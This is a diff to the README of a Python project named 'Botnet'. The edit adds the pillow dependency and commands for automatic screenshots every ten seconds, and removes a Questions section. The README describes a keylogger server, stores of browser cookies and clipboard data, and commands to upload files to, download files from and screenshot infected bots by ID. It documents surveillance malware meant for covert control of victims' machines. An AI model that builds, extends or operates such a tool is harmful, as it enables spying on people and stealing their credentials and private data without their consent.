@@ -23,7 +23,6 @@
 - [Command Reference](#-command-reference)
 - [Screenshots](#️-screenshots)
 - [License and Usage](#-license-and-usage)
-- [Questions](#-questions)
 
 ## 🚀 Features
 
@@ -72,8 +71,8 @@ Botnet/
 ├── Kserver.py             # Keylogger Server (Separate)
 ├── web_dashboard.py       # Web Dashboard
 ├── clipboard_data/        # Clipboard Data
-├── cookies/               # Browser Cookies
-├── downloads/             # Downloaded Files
+├── cookies/              # Browser Cookies
+├── downloads/            # Downloaded Files
 └── README.md
 ```
 
@@ -101,7 +100,7 @@ graph TD
 python3 --version
 
 # Required packages
-pip install pycryptodome pynput flask requests stem psutil browser-cookie3
+pip install pycryptodome pynput flask requests stem psutil browser-cookie3 pillow
 ```
 
 ### Quick Installation
@@ -127,6 +126,7 @@ stem>=1.8.0
 psutil>=5.8.0
 browser-cookie3>=0.15.0
 dnslib>=0.9.0
+pillow>=8.0.0
 ```
 
 ## 🎯 Usage
@@ -269,8 +269,12 @@ upload <bot_id> <local_file> [remote_name]
 # File download
 download <bot_id> <remote_file> [local_path]
 
-# Screenshot
+# Screenshot (single)
 screenshot <bot_id>
+
+# Automatic screenshots (every 10 seconds)
+ss start <bot_id>
+ss stop <bot_id>
 ```
 
 ### 🔍 Data Collection
@@ -456,10 +460,6 @@ Use GitHub Issues for bug reports:
 - Python Version: [3.8+]
 - Botnet Version: [2.0]
 ```
-
-## 🤔 Questions
-
-### 🏗️ How Long Did It Take to Build?
 
 ## 🙏 Thanks
 
